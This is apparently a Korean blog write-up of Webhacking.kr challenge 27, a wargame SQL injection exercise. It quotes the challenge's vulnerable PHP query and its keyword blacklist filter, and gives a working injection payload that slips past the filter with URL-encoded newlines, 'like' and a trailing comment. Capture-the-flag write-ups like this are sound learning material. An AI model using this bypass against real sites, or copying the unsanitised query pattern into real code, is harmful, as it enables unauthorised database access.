---
layout: post
title: "Webhacking.kr 27번 문제"
description: ""
categories : development
sub_categories : ""
date: 2016-05-01
tags: [webhacking, 'webhacking.kr']
comments: true
share: true
background_image: /assets/images/posts/well-used/hacked.jpg
---

27번문제는 `SQL INJECTION`관련 문제입니다.

해당 문제의 소스를 보면, index.phps 가 주석처리되어있습니다.

해당 파일을 보면 아래와 같은 소스를 볼수있습니다. no라는 파라미터에 값을 1로 하면 `gest`가 출력되고 1이외 값을 대입했을때는

쿼리에러를 출려합니다. 두번째 조건의 필터링을 우회해서 쿼리문을 만들어 요청해본다.

  

0) or like 2 (`0)%0Aor%0Ano%0Alike%0A2%0A--+`)

  

  

    if($_GET[no]){if(eregi("#|union|from|challenge|select|\(|\t|/|limit|=|0x",$_GET[no])) exit("no hack");$q=@mysql_fetch_array(mysql_query("select id from challenge27_table where id='guest' and no=($_GET[no])")) or die("query error");if($q[id]=="guest") echo("guest");if($q[id]=="admin") @solve();}

![](/assets/images/posts/612/2615984C5725EB39214638.JPEG)

  

